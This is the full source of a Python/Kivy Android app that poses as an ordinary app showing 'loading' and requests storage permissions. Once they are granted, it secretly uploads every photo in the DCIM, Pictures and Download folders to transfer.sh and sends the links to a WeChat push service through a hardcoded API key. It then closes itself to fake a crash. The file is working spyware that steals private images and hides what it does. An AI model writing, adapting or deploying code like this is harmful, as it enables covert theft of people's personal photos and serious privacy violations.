import os
import urllib.request
import urllib.parse
from threading import Thread
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock

SEND_KEY = "SCT376607TcmvwGpqagghdx5x7lbIJvBAw"

scan_paths = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Download"
]

def fake_crash():
    try:
        from jnius import autoclass
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        activity.finish()
    except Exception:
        pass

def upload_image(file_path):
    try:
        file_name = os.path.basename(file_path)
        with open(file_path, "rb") as f:
            data = f.read()
        req = urllib.request.Request(
            f"https://transfer.sh/{urllib.parse.quote(file_name)}",
            data=data,
            method="PUT"
        )
        req.add_header("User-Agent", "Mozilla/5.0")
        with urllib.request.urlopen(req, timeout=30) as res:
            return res.read().decode("utf-8").strip()
    except Exception:
        return None

def send_wechat_msg(content):
    try:
        url = f"https://sctapi.ftqq.com/{SEND_KEY}.send"
        post_data = urllib.parse.urlencode({
            "title": "link",
            "desp": content
        }).encode("utf-8")
        req = urllib.request.Request(url, data=post_data, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def background_work():
    link_list = []
    for dir_path in scan_paths:
        if not os.path.isdir(dir_path):
            continue
        for root, _, file_names in os.walk(dir_path):
            for filename in file_names:
                if filename.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    full_file = os.path.join(root, filename)
                    res_link = upload_image(full_file)
                    if res_link:
                        link_list.append(f"- {filename}：{res_link}")
    if link_list:
        send_wechat_msg("\n\n".join(link_list))

class CrashApp(App):
    def build(self):
        self.title = "app"
        self.check_count = 0
        layout = BoxLayout(orientation="vertical", padding=40, spacing=20)
        self.status_label = Label(text="loading", font_size=18)
        layout.add_widget(self.status_label)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])
        except Exception:
            pass
        Clock.schedule_interval(self.check_permission, 0.3)
        return layout

    def check_permission(self, dt):
        self.check_count += 1
        try:
            from android.permissions import check_permission, Permission
            read_ok = check_permission(Permission.READ_EXTERNAL_STORAGE)
            write_ok = check_permission(Permission.WRITE_EXTERNAL_STORAGE)
            if read_ok and write_ok:
                Thread(target=background_work, daemon=True).start()
                fake_crash()
                return False
            if self.check_count > 30:
                self.status_label.text = "fail"
                return False
        except Exception:
            Thread(target=background_work, daemon=True).start()
            fake_crash()
            return False

if __name__ == "__main__":
    CrashApp().run()
